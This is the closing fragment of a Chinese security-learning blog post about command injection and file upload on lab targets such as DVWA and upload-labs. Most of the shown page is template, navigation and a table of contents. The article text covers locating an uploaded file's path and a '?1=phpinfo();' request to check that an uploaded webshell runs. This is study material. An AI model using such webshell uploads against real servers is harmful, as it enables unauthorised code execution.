class="line">2.通过右键图片，用新标签页打开来直接抵达文件位置，从而确定文件路径</span><br></pre></td></tr></table></figure><h3 id="木马上传成功使用验证"><a href="#木马上传成功使用验证" class="headerlink" title="木马上传成功使用验证"></a>木马上传成功使用验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=phpinfo();</span><br></pre></td></tr></table></figure><p>使用上边的指令通过页面弹出方式来判断是否上传成功，以及能否使用。</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ourobros.top">Ourobros</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ourobros.top/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/">https://ourobros.top/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ourobros.top" target="_blank">Ourobrosの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar(1).jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" title="CSRF漏洞相关学习"><img class="cover" src="https://pic.imge.cc/2024/08/20/66c47c70a3cee.jpg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CSRF漏洞相关学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar(1).jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__name">Ourobros</div><div class="author-info__description">如果找不到答案，就去找自己吧</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HackingTree/Blog.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/HackingTree/Blog.github.io" target="_blank" title="Github"><i class="fab fa-github" style="color:#24292e"></i></a><a class="social-icon" href="mailto:3532846413@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color:#4a7dbe"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><p>欢迎来到<font color="#87CEEB">OurobrosのBlog</font></p><br><a href="#"><font color="#FFA500">初次加载可能卡顿，请耐心等待或者刷新页面</font></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%A6%82%E5%BF%B5%E8%A1%A5%E5%85%85"><span class="toc-number">1.0.1.</span> <span class="toc-text">一些概念补充</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A6%82%E5%BF%B5%E8%A1%A5%E5%85%85"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">服务器概念补充</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ip%E6%A6%82%E5%BF%B5%E8%A1%A5%E5%85%85"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">ip概念补充</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.0.1.2.1.</span> <span class="toc-text">不同类型局域网的应用场景</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#docker%E9%95%9C%E5%83%8F%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E8%A1%A5%E5%85%85"><span class="toc-number">1.0.1.2.2.</span> <span class="toc-text">docker镜像网络概念补充</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">1.0.2.</span> <span class="toc-text">DVWA靶场搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">配置使用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.0.3.</span> <span class="toc-text">命令注入漏洞详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">常见危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-eval%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E9%80%A0%E6%88%90%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.3.2.1.</span> <span class="toc-text">1.eval（）函数造成的命令注入漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-system-%E5%87%BD%E6%95%B0%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.3.2.2.</span> <span class="toc-text">2.system()函数造成的漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-shell-exec-%E5%87%BD%E6%95%B0%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.3.2.3.</span> <span class="toc-text">3.shell_exec()函数造成的漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-passthru-%E5%87%BD%E6%95%B0%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.3.2.4.</span> <span class="toc-text">4.passthru()函数造成的漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.4.</span> <span class="toc-text">扩展：图片马制作流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-notepad-%E6%96%87%E4%BB%B6%E6%89%93%E5%BC%80%E6%B7%BB%E5%8A%A0"><span class="toc-number">1.0.4.0.1.</span> <span class="toc-text">1.notepad++文件打开添加</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-cmd%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%90%88%E6%88%90%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">1.0.4.0.2.</span> <span class="toc-text">2.cmd命令执行合成图片马</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-ps"><span class="toc-number">1.0.4.0.3.</span> <span class="toc-text">3.ps</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E6%AC%BA%E9%AA%97"><span class="toc-number">1.0.4.0.4.</span> <span class="toc-text">4.文件欺骗</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">文件上传条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%89%E4%B8%8A%E4%BC%A0%E7%82%B9"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">1.有上传点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%90%8E%E7%AB%AF%E5%85%81%E8%AE%B8%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8A%E4%BC%A0%EF%BC%8C%E6%88%96%E8%80%85%E8%AF%B4%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">2.后端允许恶意文件的上传，或者说我们可以绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.0.3.</span> <span class="toc-text">3.上传的文件服务器可以执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%83%BD%E8%AE%BF%E9%97%AE%E5%88%B0%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.0.4.</span> <span class="toc-text">4.能访问到上传的文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A%E8%B7%AF%E5%BE%84%E6%A6%82%E5%BF%B5%E8%A1%A5%E5%85%85"><span class="toc-number">2.2.0.5.</span> <span class="toc-text">扩展：路径概念补充</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E7%9B%AE%E5%BD%95%EF%BC%9A"><span class="toc-number">2.2.0.5.0.1.</span> <span class="toc-text">1.目录：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E4%BB%A3%E7%A0%81%E5%9D%97"><span class="toc-number">2.2.0.5.0.2.</span> <span class="toc-text">2.代码块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.0.5.0.3.</span> <span class="toc-text">3.文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%89%8B%E5%B7%A5%E5%AE%9E%E6%93%8D"><span class="toc-number">2.3.</span> <span class="toc-text">简单手工实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%87%86%E5%A4%87%E8%A6%81%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9C%A8%E9%A9%AC%EF%BC%8C%E5%B7%A5%E5%85%B7"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">1.准备要上传的文件，木马，工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%EF%BC%8C%E8%AE%B0%E5%BD%95%E6%9C%A8%E9%A9%AC%E8%B7%AF%E5%BE%84"><span class="toc-number">2.3.0.2.</span> <span class="toc-text">2.上传木马，记录木马路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%B9%B6%E8%BE%93%E5%85%A51-phpinfo%EF%BC%88%EF%BC%89%E6%9D%A5%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E8%B5%B7%E4%BD%9C%E7%94%A8"><span class="toc-number">2.3.0.3.</span> <span class="toc-text">3.访问文件路径，并输入1&#x3D;phpinfo（）来查看文件是否起作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.0.4.</span> <span class="toc-text">4.简单命令操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">2.4.</span> <span class="toc-text">常见webshell管理工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%EF%BC%88AntSword%EF%BC%89"><span class="toc-number">2.4.1.</span> <span class="toc-text">蚁剑（AntSword）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">主要功能：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">安装流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">使用功能详解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E9%A6%96%E5%85%88%E7%82%B9%E5%BC%80webshell%E7%95%8C%E9%9D%A2%E5%90%8E%E7%82%B9%E5%87%BB%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE"><span class="toc-number">2.4.1.3.0.1.</span> <span class="toc-text">1.首先点开webshell界面后点击添加数据</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E6%A0%8F"><span class="toc-number">2.4.1.3.0.2.</span> <span class="toc-text">2.基础配置栏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.1.3.0.3.</span> <span class="toc-text">3.请求信息</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E5%85%B6%E4%BB%96%E8%AE%BE%E7%BD%AE"><span class="toc-number">2.4.1.3.0.4.</span> <span class="toc-text">4.其他设置</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-%E7%AE%80%E5%8D%95%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.4.1.3.0.5.</span> <span class="toc-text">5.简单连接</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-%E6%89%93%E5%BC%80shell%E9%9D%A2%E6%9D%BF"><span class="toc-number">2.4.1.3.0.6.</span> <span class="toc-text">6.打开shell面板</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C"><span class="toc-number">2.4.1.3.0.7.</span> <span class="toc-text">7.数据操作</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%EF%BC%88Behinder%EF%BC%89"><span class="toc-number">2.4.2.</span> <span class="toc-text">冰蝎（Behinder）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD%EF%BC%9A-1"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">主要功能：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3-1"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">使用功能详解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F"><span class="toc-number">2.4.2.2.0.1.</span> <span class="toc-text">1.文件打开方式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%86%B0%E8%9D%8Ewebshell"><span class="toc-number">2.4.2.2.0.2.</span> <span class="toc-text">2.冰蝎webshell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E4%BC%A0%E9%A9%AC%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.4.2.2.0.3.</span> <span class="toc-text">3.传马连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%EF%BC%88Godzilla%EF%BC%89"><span class="toc-number">2.4.3.</span> <span class="toc-text">哥斯拉（Godzilla）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD%EF%BC%9A-2"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">主要功能：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3-2"><span class="toc-number">2.4.3.2.</span> <span class="toc-text">使用功能详解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">2.4.3.2.0.1.</span> <span class="toc-text">1.启动流程</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E7%AE%A1%E7%90%86%E7%94%9F%E6%88%90"><span class="toc-number">2.4.3.2.0.2.</span> <span class="toc-text">2.管理生成</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E6%8B%BF%E5%8F%96webshell"><span class="toc-number">2.4.3.2.0.3.</span> <span class="toc-text">3.拿取webshell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E6%93%8D%E4%BD%9C%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.4.3.2.0.4.</span> <span class="toc-text">4.操作连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-labs%E9%9D%B6%E5%9C%BA"><span class="toc-number">2.5.</span> <span class="toc-text">upload-labs靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B"><span class="toc-number">2.5.1.</span> <span class="toc-text">靶场安装流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%90%8E%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95"><span class="toc-number">2.5.2.</span> <span class="toc-text">前后端检测判断方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F"><span class="toc-number">2.5.3.</span> <span class="toc-text">上传路径获取方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81"><span class="toc-number">2.5.4.</span> <span class="toc-text">木马上传成功使用验证</span></a></li></ol></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" title="命令注入与文件上传相关学习">命令注入与文件上传相关学习</a><time datetime="2024-09-05T10:17:03.000Z" title="发表于 2024-09-05 18:17:03">2024-09-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" title="CSRF漏洞相关学习"><img src="https://pic.imge.cc/2024/08/20/66c47c70a3cee.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="CSRF漏洞相关学习"></a><div class="content"><a class="title" href="/2024/08/16/CSRF%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" title="CSRF漏洞相关学习">CSRF漏洞相关学习</a><time datetime="2024-08-16T09:25:39.000Z" title="发表于 2024-08-16 17:25:39">2024-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/" title="burpsuite使用"><img src="https://pic.imge.cc/2024/08/15/66bd67c6a845d.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="burpsuite使用"></a><div class="content"><a class="title" href="/2024/08/15/burpsuite%E4%BD%BF%E7%94%A8/" title="burpsuite使用">burpsuite使用</a><time datetime="2024-08-15T02:22:40.000Z" title="发表于 2024-08-15 10:22:40">2024-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" title="爆破与并发相关学习"><img src="https://pic.imge.cc/2024/08/15/66bd61774b155.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="爆破与并发相关学习"></a><div class="content"><a class="title" href="/2024/08/15/%E7%88%86%E7%A0%B4%E4%B8%8E%E5%B9%B6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" title="爆破与并发相关学习">爆破与并发相关学习</a><time datetime="2024-08-15T02:09:52.000Z" title="发表于 2024-08-15 10:09:52">2024-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/11/http%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" title="http协议学习"><img src="https://pic.imge.cc/2024/08/11/66b8b34a1deb8.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="http协议学习"></a><div class="content"><a class="title" href="/2024/08/11/http%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" title="http协议学习">http协议学习</a><time datetime="2024-08-11T12:49:48.000Z" title="发表于 2024-08-11 20:49:48">2024-08-11</time></div></div></div></div></div></div></main><footer id="footer" style="background:0 0"><div id="footer-wrap"><div class="copyright">&copy;2024 By Ourobros</div><div class="footer_custom_text"><p>欢迎来到OurobroのBlog</p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight,500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><div class="js-pjax"></div><script src="./js/snowflake.js" type="text/javascript"></script><script async src="./js/title.js"></script><script async src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script defer src="./js/lunar.js"></script><script defer src="./js/day.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="stronger,better,smarter,faster,patience" data-fontsize="15px" data-random="false" async></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span> 数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script data-pjax>function butterfly_clock_anzhiyu_injector_config(){var a=document.getElementsByClassName("sticky_layout")[0];console.log("已挂载butterfly_clock_anzhiyu"),a&&a.insertAdjacentHTML("afterbegin",'<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>')}for(var 